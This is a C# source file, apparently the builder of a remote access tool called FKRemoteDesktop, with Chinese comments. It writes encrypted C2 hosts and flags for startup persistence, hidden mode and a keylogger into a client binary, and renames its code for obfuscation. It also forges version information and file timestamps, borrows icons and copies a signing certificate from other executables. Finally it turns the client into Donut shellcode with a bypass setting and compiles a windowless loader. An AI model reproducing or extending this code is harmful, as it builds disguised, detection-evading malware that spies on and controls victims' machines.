using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Structs;
using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Text;
using Vestris.ResourceLib;
using FKRemoteDesktop.Cryptography;
using FKRemoteDesktop.Donut;
using System.Reflection;
using System.Diagnostics;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Linq;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Builder
{
    public static class ClientWrapper
    {
        public static string WriteSettings(string srcFilePath, SBuildOptions options)
        {
            string outputFile = options.OutputPath;
            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(srcFilePath))
            {
                // 第一步：写入Setting
                WriteAsmSettings(asmDef, options);

                // 第二步：文件重命名
                Renamer r = new Renamer(asmDef);
                if (!r.Perform())
                    throw new Exception("客户端重命名失败!");

                // 第三步：保存数据
                string directory = Path.GetDirectoryName(outputFile);
                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(outputFile);
                outputFile = Path.Combine(directory, $"{fileNameWithoutExtension}_Setting.exe");
                r.AsmDef.Write(outputFile);

                // 检查生成的文件是否存在
                if (!File.Exists(outputFile))
                {
                    throw new FileNotFoundException($"修改文件配置失败.");
                }
            }
            return outputFile;
        }

        private static void WriteAsmSettings(AssemblyDefinition asmDef, SBuildOptions options)
        {
            if (!File.Exists(ServerConfig.CertificatePath))
            {
                throw new Exception("缺失签名文件，生成客户端失败");
            }
            var caCertificate = new X509Certificate2(ServerConfig.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // 不要导出私钥
            var key = serverCertificate.Thumbprint;
            var aes = new Aes256(key);

            byte[] signature;
            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }

            // 填充客户端配置
            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "FKRemoteDesktop.Configs.SettingsFromServer")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                {
                                    switch (strings)
                                    {
                                        case 1: // FKRemoteDesktop.Configs.Settings HOSTS
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(options.RawHosts);
                                            break;
                                        case 2: // FKRemoteDesktop.Configs.Settings TAG
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(options.Tag);
                                            break;
                                        case 3: // FKRemoteDesktop.Configs.Settings MUTEX
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(options.Mutex);
                                            break;
                                        case 4: // FKRemoteDesktop.Configs.Settings ENCRYPTIONKEY
                                            methodDef.Body.Instructions[i].Operand = key;
                                            break;
                                        case 5: // FKRemoteDesktop.Configs.Settings SERVERSIGNATURE
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                            break;
                                        case 6: // FKRemoteDesktop.Configs.Settings SERVERCERTIFICATESTR
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: // FKRemoteDesktop.Configs.Settings INSTALL
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(options.Install));
                                            break;
                                        case 2: // FKRemoteDesktop.Configs.Settings ISHIDEMODE
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(options.HideFile));
                                            break;
                                        case 3: // FKRemoteDesktop.Configs.Settings STARTUP
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(options.Startup));
                                            break;
                                        case 4: // FKRemoteDesktop.Configs.Settings ENABLELOGGER
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(options.Keylogger));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4 ||
                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_5) // int
                                {
                                    // FKRemoteDesktop.Configs.Settings RECONNECTDELAY
                                    methodDef.Body.Instructions[i].Operand = options.Delay;
                                }
                            }
                        }
                    }
                }
            }
        }

        private static OpCode BoolOpCode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        public static string MofifyAsmInfo(string srcFilePath, SBuildOptions options)
        {
            if (options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(srcFilePath);

                versionResource.FileVersion = options.AssemblyInformation[7];
                versionResource.ProductVersion = options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = options.AssemblyInformation[5];
                // 修改ModifyTime
                string[] modifyTime = options.AssemblyInformation[8].Split(new char[] { ' ' }, StringSplitOptions.None);
                TimerChangeHelper.ChangeExeTime(srcFilePath, modifyTime[0], modifyTime[1]);

                versionResource.SaveTo(srcFilePath);
            }

            // 检查生成的文件是否存在
            if (!File.Exists(srcFilePath))
            {
                throw new FileNotFoundException($"修改文件信息失败.");
            }
            return srcFilePath;
        }

        public static string ChangeIcon(string srcFilePath, SBuildOptions options)
        {
            if (!string.IsNullOrEmpty(options.IconPath))
            {
                IconFile iconFile = new IconFile(options.IconPath);
                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(srcFilePath);
            }
            else if (!string.IsNullOrEmpty(options.CopyIconInfoPath))
            {
                string icoFile = GetIcon(options.CopyIconInfoPath);
                IconFile iconFile = new IconFile(icoFile);
                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(srcFilePath);
            }

            // 检查生成的文件是否存在
            if (!File.Exists(srcFilePath))
            {
                throw new FileNotFoundException($"修改文件ICON失败.");
            }
            return srcFilePath;
        }

        private static string GetIcon(string path)
        {
            try
            {
                string directory = Path.GetDirectoryName(path);
                string filenameWithoutExt = Path.GetFileNameWithoutExtension(path);

                // 构造 ico 文件完整路径
                string iconFile = Path.Combine(directory, filenameWithoutExt + ".ico");
                using (FileStream fs = new FileStream(iconFile, FileMode.Create))
                {
                    IconExtractorHelper.Extract1stIconTo(path, fs);
                }
                return iconFile;
            }
            catch { }
            return "";
        }

        public static string AddSignature(string srcFilePath, SBuildOptions options)
        {
            string directory = Path.GetDirectoryName(srcFilePath);
            string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(srcFilePath);
            string outputFile = srcFilePath;
            byte[] certBytes = PEFileInfoHelper.CopyCert(options.CopySignaturePath);
            if (certBytes.Length != 0)
            {
                string originalPath = srcFilePath;
                outputFile = Path.Combine(directory, $"{fileNameWithoutExtension}_Signed.exe");
                PEFileInfoHelper.WriteCert(certBytes, originalPath, outputFile);
            }

            // 检查生成的文件是否存在
            if (!File.Exists(outputFile))
            {
                throw new FileNotFoundException($"为文件添加证书失败.");
            }
            return outputFile;
        }

        public static string ConvertExtToPayloadBin(string srcFilePath)
        {
            // 获取文件所在目录和文件名
            string originalPath = srcFilePath;
            string directory = Path.GetDirectoryName(originalPath);
            string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(originalPath);
            string outputPath = Path.Combine(directory, $"{fileNameWithoutExtension}.bin");

            DonutConfig config = new DonutConfig();
            config.Arch = 3;
            config.Bypass = 3;
            config.InputFile = originalPath;
            config.Payload = outputPath;
            config.Class = "Program";
            config.Method = "Main";
            int ret = DonutGenerator.Donut_Create(ref config);

            // 检查的不是bin版本，而使用b64版本
            // stepFile = stepFile + ".b64";
            // 检查生成的文件是否存在
            if (!File.Exists(outputPath) || (ret != Constants.DONUT_ERROR_SUCCESS))
            {
                throw new FileNotFoundException($"文件摘取 Payload 信息失败.");
            }
            return outputPath;
        }
   
        public static string CompilerCodeToExe(string code, string outputFile)
        {
            // 配置 CodeDom 编译器
            using (var provider = new CSharpCodeProvider())
            {
                var parameters = new CompilerParameters
                {
                    GenerateExecutable = true,
                    OutputAssembly = outputFile,
                    CompilerOptions = "/target:winexe" // 保持控制台程序
                };
                parameters.ReferencedAssemblies.Add("System.dll"); // 涵盖 System, System.IO, System.Text
                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll"); // 涵盖 System.Runtime.InteropServices
                parameters.ReferencedAssemblies.Add("System.Security.dll"); // 涵盖 System.Security.Cryptography
                parameters.ReferencedAssemblies.Add("System.Diagnostics.Process.dll"); // 涵盖 System.Diagnostics.Process
                // 编译代码
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
                if (results.Errors.HasErrors || !File.Exists(outputFile))
                {
                    string[] errors = results.Errors.Cast<CompilerError>().Select(e => e.ToString()).ToArray();
                    throw new FileNotFoundException($"生成最终 exe 文件失败: {string.Join(Environment.NewLine, errors)}");
                }
            }
            return outputFile;
        }
    }
}
